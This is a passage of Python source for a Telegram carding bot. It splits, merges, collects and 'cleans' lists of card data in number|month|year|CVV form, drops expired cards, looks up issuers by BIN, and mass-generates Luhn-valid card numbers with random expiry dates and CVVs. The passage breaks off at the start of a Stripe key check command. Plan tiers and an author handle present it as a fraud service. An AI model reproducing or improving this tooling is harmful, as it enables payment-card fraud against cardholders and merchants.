        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return

    file_path = await reply_msg.download_media()

    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()

    cards = extract_cc(content)

    if not cards:
        await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ!"), parse_mode='html')
        os.remove(file_path)
        return

    # Check if user provided a chunk size directly (e.g. /split 5000)
    parts = event.raw_text.strip().split()
    inline_size = None
    if len(parts) >= 2:
        try:
            inline_size = int(parts[1])
            if inline_size < 10:
                inline_size = 10
        except ValueError:
            inline_size = None

    if inline_size:
        # Immediately split without showing menu
        status_msg = await event.reply(premium_emoji(f"🔄 Sᴘʟɪᴛᴛɪɴɢ {len(cards)} ᴄᴀʀᴅs ɪɴᴛᴏ {inline_size} ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ..."), parse_mode='html')
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
            except:
                pass
        chunks = [cards[i:i + inline_size] for i in range(0, len(cards), inline_size)]
        for i, chunk in enumerate(chunks, 1):
            filename = f"cards_part_{i}_of_{len(chunks)}.txt"
            async with aiofiles.open(filename, 'w') as f:
                for card in chunk:
                    await f.write(f"{card}\n")
            await bot.send_file(user_id, filename, caption=premium_emoji(f" Pᴀʀᴛ {i}/{len(chunks)}\n Cᴀʀᴅs: {len(chunk)}"))
            try:
                os.remove(filename)
            except:
                pass
            await asyncio.sleep(2)
        await safe_edit(status_msg, premium_emoji(f"✅ Sᴘʟɪᴛ ᴄᴏᴍᴘʟᴇᴛᴇ!\n\n📊 Tᴏᴛᴀʟ: {len(cards)} ᴄᴀʀᴅs\n📁 Fɪʟᴇs: {len(chunks)}\n📄 Cᴀʀᴅs ᴘᴇʀ ғɪʟᴇ: {inline_size}"), parse_mode='html')
        return

    # No size given — show the menu
    TEMP_FILE_DATA[user_id] = {
        'cards': cards,
        'file_path': file_path,
        'total_cards': len(cards)
    }

    buttons = [
        [Button.inline("  100", f"split_size:100:{user_id}".encode(), style="primary", icon=5343636681473935403),
         Button.inline("  500", f"split_size:500:{user_id}".encode(), style="primary", icon=5343636681473935403)],
        [Button.inline("  1000", f"split_size:1000:{user_id}".encode(), style="primary", icon=5343636681473935403),
         Button.inline("  5000", f"split_size:5000:{user_id}".encode(), style="primary", icon=5343636681473935403)],
        [Button.inline(" ️ Cᴜsᴛᴏᴍ", f"split_custom:{user_id}".encode(
        ), style="success", icon=5444931419270839381)],
        [Button.inline("  Cᴀɴᴄᴇʟ", f"split_cancel:{user_id}".encode(
        ), style="danger", icon=4915853119839011973)]
    ]

    await event.reply(
        premium_emoji(
            f"📁 Fɪʟᴇ ʟᴏᴀᴅᴇᴅ: {len(cards)} ᴄᴀʀᴅs ғᴏᴜɴᴅ!\n\n📊 Sᴇʟᴇᴄᴛ ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ:"),
        buttons=buttons,
        parse_mode='html'
    )


@bot.on(events.CallbackQuery(pattern=rb"split_size:(\d+):(\d+)"))
async def split_size_callback(event):
    match = event.pattern_match
    chunk_size = int(match.group(1).decode())
    user_id = int(match.group(2).decode())

    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return

    if user_id not in TEMP_FILE_DATA:
        await safe_edit(event, premium_emoji("❌ Fɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ! Pʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀɢᴀɪɴ."), parse_mode='html')
        return

    file_data = TEMP_FILE_DATA.pop(user_id)
    cards = file_data['cards']
    file_path = file_data['file_path']

    if os.path.exists(file_path):
        try:
            os.remove(file_path)
        except:
            pass

    await safe_edit(event, premium_emoji(f"🔄 Sᴘʟɪᴛᴛɪɴɢ {len(cards)} ᴄᴀʀᴅs ɪɴᴛᴏ {chunk_size} ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ..."), parse_mode='html')

    chunks = [cards[i:i + chunk_size]
              for i in range(0, len(cards), chunk_size)]

    for i, chunk in enumerate(chunks, 1):
        filename = f"cards_part_{i}_of_{len(chunks)}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for card in chunk:
                await f.write(f"{card}\n")

        await bot.send_file(
            user_id,
            filename,
            caption=premium_emoji(
                f" Pᴀʀᴛ {i}/{len(chunks)}\n Cᴀʀᴅs: {len(chunk)}")
        )

        try:
            os.remove(filename)
        except:
            pass

        await asyncio.sleep(2)

    await safe_edit(event, premium_emoji(f"✅ Sᴘʟɪᴛ ᴄᴏᴍᴘʟᴇᴛᴇ!\n\n📊 Tᴏᴛᴀʟ: {len(cards)} ᴄᴀʀᴅs\n📁 Fɪʟᴇs: {len(chunks)}\n📄 Cᴀʀᴅs ᴘᴇʀ ғɪʟᴇ: {chunk_size}"), parse_mode='html')


@bot.on(events.CallbackQuery(pattern=rb"split_custom:(\d+)"))
async def split_custom_callback(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())

    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return

    if user_id not in TEMP_FILE_DATA:
        await safe_edit(event, premium_emoji("❌ Fɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ! Pʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀɢᴀɪɴ."), parse_mode='html')
        return

    await safe_edit(event, premium_emoji("📝 Sᴇɴᴅ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏғ ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ (10-15000):"), parse_mode='html')

    @bot.on(events.NewMessage(func=lambda e: e.sender_id == user_id and e.text and e.text.isdigit()))
    async def get_custom_size(msg_event):
        try:
            chunk_size = int(msg_event.text.strip())

            if chunk_size < 10:
                await msg_event.reply(premium_emoji("❌ Mɪɴɪᴍᴜᴍ 10 ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ!"), parse_mode='html')
                return

            if chunk_size > 15000:
                await msg_event.reply(premium_emoji("❌ Mᴀxɪᴍᴜᴍ 5000 ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ!"), parse_mode='html')
                return

            if user_id not in TEMP_FILE_DATA:
                await msg_event.reply(premium_emoji("❌ Fɪʟᴇ ᴇxᴘɪʀᴇᴅ! Pʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀɢᴀɪɴ."), parse_mode='html')
                bot.remove_event_handler(get_custom_size)
                return

            file_data = TEMP_FILE_DATA.pop(user_id)
            cards = file_data['cards']
            file_path = file_data['file_path']

            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except:
                    pass

            status_msg = await msg_event.reply(premium_emoji(f"🔄 Sᴘʟɪᴛᴛɪɴɢ {len(cards)} ᴄᴀʀᴅs ɪɴᴛᴏ {chunk_size} ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ..."), parse_mode='html')

            chunks = [cards[i:i + chunk_size]
                      for i in range(0, len(cards), chunk_size)]

            for i, chunk in enumerate(chunks, 1):
                filename = f"cards_part_{i}_of_{len(chunks)}.txt"
                async with aiofiles.open(filename, 'w') as f:
                    for card in chunk:
                        await f.write(f"{card}\n")

                await bot.send_file(
                    user_id,
                    filename,
                    caption=premium_emoji(
                        f" Pᴀʀᴛ {i}/{len(chunks)}\n Cᴀʀᴅs: {len(chunk)}")
                )

                try:
                    os.remove(filename)
                except:
                    pass

                await asyncio.sleep(2)

            await safe_edit(status_msg, premium_emoji(f"✅ Sᴘʟɪᴛ ᴄᴏᴍᴘʟᴇᴛᴇ!\n\n📊 Tᴏᴛᴀʟ: {len(cards)} ᴄᴀʀᴅs\n📁 Fɪʟᴇs: {len(chunks)}\n📄 Cᴀʀᴅs ᴘᴇʀ ғɪʟᴇ: {chunk_size}"), parse_mode='html')

        except Exception as e:
            await msg_event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        finally:
            bot.remove_event_handler(get_custom_size)


@bot.on(events.CallbackQuery(pattern=rb"split_cancel:(\d+)"))
async def split_cancel_callback(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())

    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return

    if user_id in TEMP_FILE_DATA:
        file_data = TEMP_FILE_DATA.pop(user_id)
        if os.path.exists(file_data['file_path']):
            try:
                os.remove(file_data['file_path'])
            except:
                pass

    await safe_edit(event, premium_emoji("❌ Cᴀɴᴄᴇʟʟᴇᴅ."), parse_mode='html')
    await event.answer("✅ Cᴀɴᴄᴇʟʟᴇᴅ", alert=True)


@bot.on(events.NewMessage(pattern='/clean'))
async def clean_file(event):
    user_id = event.sender_id

    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji("🔄 Pʀᴏᴄᴇssɪɴɢ ғɪʟᴇ..."), parse_mode='html')

    try:
        file_path = await reply_msg.download_media()

        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()

        os.remove(file_path)

        cards = extract_cc(content)

        if not cards:
            await safe_edit(status_msg, premium_emoji("❌ Nᴏ ᴄᴀʀᴅs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ!"), parse_mode='html')
            return


        valid_cards = []
        expired_cards = []
        invalid_lines = []

        current_year = datetime.now().year
        current_month = datetime.now().month

        for card in cards:
            parts = card.split('|')
            if len(parts) == 4:
                cc, mm, yy, cvv = parts
                try:
                    card_year = int(yy)
                    card_month = int(mm)
                    if card_year < 100:
                        card_year += 2000
                    if card_year > current_year or (card_year == current_year and card_month >= current_month):
                        valid_cards.append(card)
                    else:
                        expired_cards.append(card)
                except:
                    valid_cards.append(card)
            else:
                invalid_lines.append(card)

        if not valid_cards and not expired_cards and not invalid_lines:
            await safe_edit(status_msg, premium_emoji("❌ Nᴏ ᴄᴀʀᴅs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ!"), parse_mode='html')
            return

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        if valid_cards:
            clean_filename = f"cleaned_cards_{timestamp}.txt"
            async with aiofiles.open(clean_filename, 'w') as f:
                for card in valid_cards:
                    await f.write(f"{card}\n")

            await bot.send_file(
                user_id,
                clean_filename,
                caption=f" Cʟᴇᴀɴᴇᴅ Fɪʟᴇ\n\n Vᴀʟɪᴅ: {len(valid_cards)}"
            )

            try:
                os.remove(clean_filename)
            except:
                pass
        
        if expired_cards:
            expired_filename = f"expired_cards_{timestamp}.txt"
            async with aiofiles.open(expired_filename, 'w') as f:
                for card in expired_cards:
                    await f.write(f"{card}\n")

            await bot.send_file(
                user_id,
                expired_filename,
                caption=f" Exᴘɪʀᴇᴅ: {len(expired_cards)}"
            )

            try:
                os.remove(expired_filename)
            except:
                pass

        if invalid_lines:
            invalid_filename = f"invalid_lines_{timestamp}.txt"
            async with aiofiles.open(invalid_filename, 'w') as f:
                for line in invalid_lines:
                    await f.write(f"{line}\n")

            await bot.send_file(
                user_id,
                invalid_filename,
                caption=f" Iɴᴠᴀʟɪᴅ: {len(invalid_lines)}"
            )

            try:
                os.remove(invalid_filename)
            except:
                pass

        if not valid_cards:
             await safe_edit(status_msg, premium_emoji(f"❌ Nᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅs ʀᴇᴍᴀɪɴɪɴɢ!\n\n⏰ Exᴘɪʀᴇᴅ: {len(expired_cards)}\n⚠️ Iɴᴠᴀʟɪᴅ: {len(invalid_lines)}"), parse_mode='html')
        else:
             await safe_edit(status_msg, premium_emoji(f"✅ Cʟᴇᴀɴɪɴɢ Dᴏɴᴇ!\n\n📊 Sᴜᴍᴍᴀʀʏ:\n   ┣ ✅ Vᴀʟɪᴅ: {len(valid_cards)}\n   ┣ ⏱️ Exᴘɪʀᴇᴅ: {len(expired_cards)}\n   ┗ ❌ Iɴᴠᴀʟɪᴅ: {len(invalid_lines)}"), parse_mode='html')

    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/merge'))
async def merge_files(event):
    user_id = event.sender_id

    if user_id in MERGE_DATA:
        await event.reply(premium_emoji("⚠️ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀɴ ᴀᴄᴛɪᴠᴇ ᴍᴇʀɢᴇ!"), parse_mode='html')
        return

    MERGE_DATA[user_id] = {
        'cards': [],
        'files': 0,
        'start_time': datetime.now(),
        'expire_time': datetime.now() + timedelta(minutes=10)
    }

    buttons = [
        Button.text(" MERGE", resize=True, single_use=True),
        Button.text(" +5M", resize=True, single_use=True),
        Button.text(" CANCELM", resize=True, single_use=True)
    ]

    await event.reply(
        premium_emoji(
            f"📂 Mᴇʀɢᴇ Mᴏᴅᴇ Aᴄᴛɪᴠᴀᴛᴇᴅ!\n\n⏱️ Tɪᴍᴇ Lᴇғᴛ: 10 ᴍɪɴᴜᴛᴇs\n📁 Fɪʟᴇs: 0\n💳 Cᴀʀᴅs: 0\n\nSᴇɴᴅ ᴍᴇ .ᴛxᴛ ғɪʟᴇs ᴀɴᴅ ᴘʀᴇss MERGE ᴛᴏ ғɪɴɪsʜ."),
        buttons=buttons,
        parse_mode='html'
    )

    if user_id in MERGE_TIMERS:
        MERGE_TIMERS[user_id].cancel()

    async def auto_cancel():
        await asyncio.sleep(600)
        if user_id in MERGE_DATA:
            MERGE_DATA.pop(user_id, None)
            try:
                await bot.send_message(user_id, premium_emoji("⏰ Mᴇʀɢᴇ ᴇxᴘɪʀᴇᴅ ᴀғᴛᴇʀ 10 ᴍɪɴᴜᴛᴇs!"), parse_mode='html')
            except:
                pass

    MERGE_TIMERS[user_id] = asyncio.create_task(auto_cancel())


@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "MERGE"))
async def merge_button(event):
    user_id = event.sender_id

    if user_id not in MERGE_DATA:
        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴍᴇʀɢᴇ!"), parse_mode='html')
        return

    data = MERGE_DATA.pop(user_id)
    cards = data['cards']

    if user_id in MERGE_TIMERS:
        MERGE_TIMERS[user_id].cancel()
        MERGE_TIMERS.pop(user_id, None)

    if not cards:
        await event.reply(premium_emoji("❌ Nᴏ ᴄᴀʀᴅs ᴄᴏʟʟᴇᴄᴛᴇᴅ!"), parse_mode='html')
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"merged_cards_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        for card in cards:
            await f.write(f"{card}\n")

    await bot.send_file(
        user_id,
        filename,
        caption=premium_emoji(
            f" Mᴇʀɢᴇ Cᴏᴍᴘʟᴇᴛᴇ!\n\n Fɪʟᴇs Mᴇʀɢᴇᴅ: {data['files']}\n Tᴏᴛᴀʟ Cᴀʀᴅs: {len(cards)}")
    )

    try:
        os.remove(filename)
    except:
        pass

    await event.reply(premium_emoji(f"✅ Mᴇʀɢᴇᴅ {len(cards)} ᴄᴀʀᴅs ғʀᴏᴍ {data['files']} ғɪʟᴇs!"), parse_mode='html')


@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "+5M"))
async def extend_merge(event):
    user_id = event.sender_id

    if user_id not in MERGE_DATA:
        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴍᴇʀɢᴇ!"), parse_mode='html')
        return

    data = MERGE_DATA[user_id]
    data['expire_time'] = data['expire_time'] + timedelta(minutes=5)

    remaining = int(
        (data['expire_time'] - datetime.now()).total_seconds() / 60)

    await event.reply(premium_emoji(f"⏱️ +5 ᴍɪɴᴜᴛᴇs ᴀᴅᴅᴇᴅ!\n📊 Rᴇᴍᴀɪɴɪɴɢ: {remaining} ᴍɪɴᴜᴛᴇs"), parse_mode='html')


@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "CANCELM"))
async def cancel_merge(event):
    user_id = event.sender_id

    if user_id not in MERGE_DATA:
        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴍᴇʀɢᴇ!"), parse_mode='html')
        return

    MERGE_DATA.pop(user_id, None)

    if user_id in MERGE_TIMERS:
        MERGE_TIMERS[user_id].cancel()
        MERGE_TIMERS.pop(user_id, None)

    await event.reply(premium_emoji("❌ Mᴇʀɢᴇ Cᴀɴᴄᴇʟʟᴇᴅ!"), parse_mode='html')



@bot.on(events.NewMessage(pattern='/collect'))
async def collect_cards(event):
    user_id = event.sender_id

    if user_id in COLLECT_DATA:
        await event.reply(premium_emoji("⚠️ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀɴ ᴀᴄᴛɪᴠᴇ ᴄᴏʟʟᴇᴄᴛɪᴏɴ!"), parse_mode='html')
        return

    COLLECT_DATA[user_id] = {
        'cards': [],
        'start_time': datetime.now(),
        'expire_time': datetime.now() + timedelta(minutes=10)
    }

    buttons = [
        Button.text(" COLLECT", resize=True, single_use=True),
        Button.text(" +5 MIN", resize=True, single_use=True),
        Button.text(" CANCEL", resize=True, single_use=True)
    ]

    await event.reply(
        premium_emoji(
            f"📥 Cᴏʟʟᴇᴄᴛɪᴏɴ Mᴏᴅᴇ Aᴄᴛɪᴠᴀᴛᴇᴅ!\n\n⏱️ Tɪᴍᴇ Lᴇғᴛ: 10 ᴍɪɴᴜᴛᴇs\n💳 Cᴀʀᴅs: 0\n\nSᴇɴᴅ ᴍᴇ ᴄᴀʀᴅs ᴀɴᴅ ᴘʀᴇss COLLECT ᴛᴏ ғɪɴɪsʜ."),
        buttons=buttons,
        parse_mode='html'
    )

    if user_id in COLLECT_TIMERS:
        COLLECT_TIMERS[user_id].cancel()

    async def auto_cancel():
        await asyncio.sleep(600)
        if user_id in COLLECT_DATA:
            data = COLLECT_DATA.pop(user_id, None)
            try:
                await bot.send_message(user_id, premium_emoji("⏰ Cᴏʟʟᴇᴄᴛɪᴏɴ ᴇxᴘɪʀᴇᴅ ᴀғᴛᴇʀ 10 ᴍɪɴᴜᴛᴇs!"), parse_mode='html')
            except:
                pass

    COLLECT_TIMERS[user_id] = asyncio.create_task(auto_cancel())


@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "COLLECT"))
async def collect_button(event):
    user_id = event.sender_id

    if user_id not in COLLECT_DATA:
        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴄᴏʟʟᴇᴄᴛɪᴏɴ!"), parse_mode='html')
        return

    data = COLLECT_DATA.pop(user_id)
    cards = data['cards']

    if user_id in COLLECT_TIMERS:
        COLLECT_TIMERS[user_id].cancel()
        COLLECT_TIMERS.pop(user_id, None)

    if not cards:
        await event.reply(premium_emoji("❌ Nᴏ ᴄᴀʀᴅs ᴄᴏʟʟᴇᴄᴛᴇᴅ!"), parse_mode='html')
        return

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"collected_cards_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        for card in cards:
            await f.write(f"{card}\n")

    await bot.send_file(
        user_id,
        filename,
        caption=premium_emoji(
            f" Cᴏʟʟᴇᴄᴛɪᴏɴ Cᴏᴍᴘʟᴇᴛᴇ!\nTᴏᴛᴀʟ Cᴀʀᴅs: {len(cards)}")
    )

    try:
        os.remove(filename)
    except:
        pass

    await event.reply(premium_emoji(f"✅ Cᴏʟʟᴇᴄᴛᴇᴅ {len(cards)} ᴄᴀʀᴅs!"), parse_mode='html')


@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "+5 MIN"))
async def extend_collect(event):
    user_id = event.sender_id

    if user_id not in COLLECT_DATA:
        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴄᴏʟʟᴇᴄᴛɪᴏɴ!"), parse_mode='html')
        return

    data = COLLECT_DATA[user_id]
    data['expire_time'] = data['expire_time'] + timedelta(minutes=5)

    remaining = int(
        (data['expire_time'] - datetime.now()).total_seconds() / 60)

    await event.reply(premium_emoji(f"⏱️ +5 ᴍɪɴᴜᴛᴇs ᴀᴅᴅᴇᴅ!\n📊 Rᴇᴍᴀɪɴɪɴɢ: {remaining} ᴍɪɴᴜᴛᴇs"), parse_mode='html')


@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "CANCEL"))
async def cancel_collect(event):
    user_id = event.sender_id

    if user_id not in COLLECT_DATA:
        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴄᴏʟʟᴇᴄᴛɪᴏɴ!"), parse_mode='html')
        return

    COLLECT_DATA.pop(user_id, None)

    if user_id in COLLECT_TIMERS:
        COLLECT_TIMERS[user_id].cancel()
        COLLECT_TIMERS.pop(user_id, None)

    await event.reply(premium_emoji("❌ Cᴏʟʟᴇᴄᴛɪᴏɴ Cᴀɴᴄᴇʟʟᴇᴅ!"), parse_mode='html')


@bot.on(events.NewMessage)
async def collect_cards_handler(event):
    user_id = event.sender_id

    if user_id not in COLLECT_DATA:
        return

    if not event.text:
        return

    if event.text.startswith('/'):
        return

    if event.text.upper() in ["COLLECT", "+5 MIN", "CANCEL"]:
        return

    cards = extract_cc(event.text)

    if not cards:
        return

    data = COLLECT_DATA[user_id]
    data['cards'].extend(cards)


@bot.on(events.NewMessage(pattern=r'^/bin(?:\s|$)'))
async def bin_lookup(event):
    user_id = event.sender_id
    if not await check_cooldown(event, user_id):
        return

    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/bin 411111</code>"), parse_mode='html')
        return

    bin_number = parts[1].strip()[:6]

    if not bin_number.isdigit() or len(bin_number) < 6:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ BIN! Eɴᴛᴇʀ ᴀᴛ ʟᴇᴀsᴛ 6 ᴅɪɢɪᴛs."), parse_mode='html')
        return

    status_msg = await event.reply(premium_emoji(f"🔄 Lᴏᴏᴋɪɴɢ ᴜᴘ BIN <code>{bin_number}</code>..."), parse_mode='html')

    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    await safe_edit(status_msg, premium_emoji(f"❌ BIN <code>{bin_number}</code> Nᴏᴛ Fᴏᴜɴᴅ!"), parse_mode='html')
                    return

                data = await res.json()

                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                prepaid = data.get('prepaid', False)
                card_type = data.get('card_type', '-')

                prepaid_text = "✅ Pʀᴇᴘᴀɪᴅ" if prepaid else "❌ Nᴏᴛ Pʀᴇᴘᴀɪᴅ"

                result = f"""🔍 <b>BIN Lᴏᴏᴋᴜᴘ</b>

💡  BIN: <code>{bin_number}</code>
💡️  Bʀᴀɴᴅ: {brand}
📝  Tʏᴘᴇ: {bin_type}
💳  Cᴀʀᴅ Tʏᴘᴇ: {card_type}
⭐  Lᴇᴠᴇʟ: {level}
🏦  Bᴀɴᴋ: {bank}
💡  Cᴏᴜɴᴛʀʏ: {country} {flag}
💵  Pʀᴇᴘᴀɪᴅ: {prepaid_text}

💡 Mᴀᴅᴇ ʙʏ @OwnerGhostHex"""

                await safe_edit(status_msg, premium_emoji(result), parse_mode='html')

    except Exception as e:
        await safe_edit(status_msg, premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/gen(?:\s|$)'))
async def gen_cards(event):
    user_id = event.sender_id
    if not await check_cooldown(event, user_id):
        return

    parts = event.raw_text.split()
    if len(parts) < 2:
        await event.reply(premium_emoji("""📝 Usᴀɢᴇ: <code>/gen BIN [count]</code>

Exᴀᴍᴘʟᴇs:
<code>/gen 415920</code>
<code>/gen 415920 20</code>
<code>/gen 415920|12|2028|123 10</code>"""), parse_mode='html')
        return

    try:
        args = parts[1]
        count = 10
        if len(parts) > 2:
            try:
                count = int(parts[2])
                if count > 5000:
                    await event.reply(premium_emoji("❌ <b>Mᴀxɪᴍᴜᴍ Lɪᴍɪᴛ Exᴄᴇᴇᴅᴇᴅ!</b>\n\nYᴏᴜ ᴄᴀɴ ɢᴇɴᴇʀᴀᴛᴇ ᴀ ᴍᴀxɪᴍᴜᴍ ᴏғ <b>5,000</b> ᴄᴀʀᴅs ᴘᴇʀ ʀᴇǫᴜᴇsᴛ."), parse_mode='html')
                    return
                if count < 1:
                    count = 10
            except:
                count = 10

        if '|' in args:
            bin_parts = args.split('|')
            cc = bin_parts[0][:16]
            mm = bin_parts[1] if len(bin_parts) > 1 and bin_parts[1] else 'None'
            yy = bin_parts[2] if len(bin_parts) > 2 and bin_parts[2] else 'None'
            cvv = bin_parts[3] if len(bin_parts) > 3 and bin_parts[3] else 'None'
        else:
            cc = args[:16]
            mm = 'None'
            yy = 'None'
            cvv = 'None'

        if not cc.isdigit() and 'x' not in cc.lower():
            await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ BIN! Mᴜsᴛ ʙᴇ ᴀᴛ ʟᴇᴀsᴛ 6 ᴅɪɢɪᴛs."), parse_mode='html')
            return

        status_msg = await event.reply(premium_emoji(f"🔄 Gᴇɴᴇʀᴀᴛɪɴɢ {count} ᴄᴀʀᴅs..."), parse_mode='html')

        start_time = time.time()
        
        async def checkLuhn(cardNo):
            nDigits = len(cardNo)
            nSum = 0
            isSecond = False
            for i in range(nDigits - 1, -1, -1):
                d = ord(cardNo[i]) - ord("0")
                if isSecond == True:
                    d = d * 2
                nSum += d // 10
                nSum += d % 10
                isSecond = not isSecond
            if nSum % 10 == 0:
                return True
            else:
                return False

        async def cc_genarator(cc, mes, ano, cvv):
            cc, mes, ano, cvv = str(cc), str(mes), str(ano), str(cvv)
            if mes != "None" and len(mes) == 1:
                mes = "0" + mes
            if ano != "None" and len(ano) == 2:
                ano = "20" + ano
            numbers = list("0123456789")
            random.shuffle(numbers)
            result = "".join(numbers)
            result = cc + result
            if cc[:2] == "37" or cc[:2] == "34":
                cc = result[0:15]
            else:
                cc = result[0:16]
            for i in range(len(cc)):
                if cc[i].lower() == 'x':
                    cc = cc[:i] + str(random.randint(0, 9)) + cc[i+1:]
            if mes == "None" or 'x' in mes.lower() or 'rnd' in mes.lower():
                mes = str(random.randint(1, 12))
                if len(mes) == 1:
                    mes = "0" + str(mes)
            if ano == "None" or 'x' in ano.lower() or 'rnd' in ano.lower():
                current_yr = datetime.now().year
                ano = random.randint(current_yr, current_yr + 8)
            if cvv == "None" or 'x' in cvv.lower() or 'rnd' in cvv.lower():
                if cc[:2] == "37" or cc[:2] == "34":
                    cvv = str(random.randint(1000, 9999))
                else:
                    cvv = str(random.randint(100, 999))
            return f"{cc}|{mes}|{ano}|{cvv}"

        cards = []
        for _ in range(count):
            while True:
                result = await cc_genarator(cc, mm, yy, cvv)
                ccx, mesx, anox, cvvx = result.split("|")
                check_luhn = await checkLuhn(ccx)
                if check_luhn:
                    cards.append(f"{ccx}|{mesx}|{anox}|{cvvx}")
                    break
                    
        end_time = time.time()
        time_taken = round(end_time - start_time, 2)

        bin_number = cc[:6] if 'x' not in cc[:6].lower() else cc
        bin_info = await get_bin_info(bin_number)
        brand, bin_type, level, bank, country, flag = bin_info
        
        info_str = f"{brand or 'UNKNOWN'} - {bin_type or 'UNKNOWN'} - {level or 'UNKNOWN'}"
        
        if user_id in ADMIN_ID:
            plan_display = 'ADMIN'
        else:
            is_prem = await is_premium(user_id)
            if not is_prem:
                plan_display = 'FREE'
            else:
                user_plan = await db_manager.get_user_plan(user_id)
                plan_display = user_plan.upper()

        caption_text = ""
        if count <= 25:
            for card in cards:
                caption_text += f"<code>{card}</code>\n"
            caption_text += "\n"

        caption = premium_emoji(f"""{caption_text}- <b>Bin:</b> <code>{bin_number}</code>
- <b>Amount:</b> {count}

- <b>Info</b> - {info_str}
- <b>Bank</b> - {bank or 'UNKNOWN'} 🏛️
- <b>Country</b> - {country or 'UNKNOWN'} - {flag}

- <b>Time</b> - {time_taken} seconds
- <b>Checked</b> - <a href="tg://user?id={user_id}">{event.sender.first_name}</a> ↳ <code>{plan_display}</code> ↲""")

        if count > 25:
            filename = f"{count}x_CC_Generated_By_{user_id}.txt"
            async with aiofiles.open(filename, 'w') as f:
                for card in cards:
                    await f.write(f"{card}\n")

            await bot.send_file(
                event.chat_id,
                filename,
                caption=caption,
                parse_mode='html'
            )

            try:
                os.remove(filename)
            except:
                pass
            await status_msg.delete()
        else:
            await safe_edit(status_msg, caption, parse_mode='html')

    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')


@bot.on(events.NewMessage(pattern='/sk'))
async def stripe_key_check(event):
    user_id = event.sender_id

    parts = event.raw_text.split()
    if len(parts) != 2:
